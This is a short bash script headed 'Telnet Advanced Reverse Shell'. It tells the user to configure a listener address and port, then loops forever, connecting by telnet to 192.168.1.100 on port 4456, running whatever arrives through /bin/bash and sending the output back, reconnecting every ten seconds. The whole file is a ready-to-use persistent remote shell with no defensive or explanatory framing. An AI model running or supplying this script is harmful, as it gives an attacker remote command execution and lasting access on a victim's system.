#!/bin/bash
# Telnet Advanced Reverse Shell
# Configure LHOST and LPORT before use

LHOST="192.168.1.100"
LPORT=4456

while true; do
    telnet $LHOST $LPORT | /bin/bash | telnet $LHOST $LPORT
    sleep 10
done
